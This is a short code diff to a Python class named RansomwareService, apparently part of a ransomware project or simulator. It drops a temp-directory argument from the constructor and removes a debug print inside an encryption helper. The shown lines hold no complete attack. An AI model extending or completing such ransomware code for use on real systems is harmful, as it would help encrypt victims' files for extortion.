@@ -12,7 +12,7 @@ from .rsa import EncryptionData
 
 class RansomwareService(DefaultService):
     def __init__(self, passphrase: Optional[str] = None):
-        super().__init__("ransomware", os.path.join(os.getcwd(), "temp"))
+        super().__init__("ransomware")
 
         self.byte_size = 2048
 
@@ -108,7 +108,6 @@ class RansomwareService(DefaultService):
         data: str,
         key_type: Union[Literal["pk"], Literal["sk"]] = "pk",
     ):
-        print(data)
         data = bytes(data, self.encoding)
         ct, tag = self.session_cipher.encrypt_and_digest(data)
         return EncryptionData( 
